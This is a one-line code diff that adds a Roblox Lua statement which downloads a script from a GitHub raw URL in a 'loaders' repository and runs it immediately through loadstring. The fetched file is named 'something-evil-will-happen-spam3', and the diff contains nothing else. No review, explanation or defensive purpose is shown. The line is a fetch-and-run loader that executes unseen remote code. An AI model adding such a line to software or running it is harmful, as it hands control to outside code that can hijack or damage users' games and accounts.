@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/something-evil-will-happen-spam3-fl25mt9kn0tn8i.lua"))()
